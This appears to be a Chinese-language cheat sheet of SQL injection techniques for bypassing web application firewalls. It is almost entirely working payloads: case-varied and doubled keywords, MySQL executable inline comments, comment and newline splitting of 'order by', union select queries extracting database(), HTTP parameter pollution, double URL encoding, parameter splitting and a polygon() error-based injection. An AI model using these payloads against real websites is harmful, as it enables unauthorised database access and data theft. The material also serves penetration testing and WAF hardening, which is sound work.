- SQL注入的绕过

  - 测试 and 1=1;or 1=1

  - 绕过

    - 1.大小写 AND　1=1

    - 2.双写 aAnNdD 1=1

    - \3. && ||  &&1=1

    - 4.and -1=-1;and 0x1

    - 5.内联注释
      - /**/:  and /!*500001*/=/*!500001*/
        MYSQL 数据的可移植性，前提条件/*!00000user()*/
        ​特性：可执行的注释

    - order by拆解数据标的字段数量

      - 空格:%23 ,换行%0a

      - /**/order/*/%0a*a*/by/**/

    - 万能符号
      - order /*//--/*/ by 3--+

    - 使用联合查询

      - union select 1,database(),3--+

      - union /*//--/*/ /*!--+/*%0aselect/*!1,2,*/database  /*//--/ */ () --+

    - 6.HTTP参数污染 inject=union/*&inject=*/select/*&inject=*/1&inject=2&inject=3&inject=4
      - inject=union/*,*/select/*,*/1,2,3,4

    - 7.双重URL编码，WAF一般都会进行URL解码，如果后端还进行一次解码就可以绕过

    - 8.参数拆分 
      a=union /*and 
      b=*/select 1,2,3,4
      and a=union /*and*/select 1,2,3,4

    - 9.select/**/polygon((select*from(select*from(select@@version)f)x))代替updatexml报错注入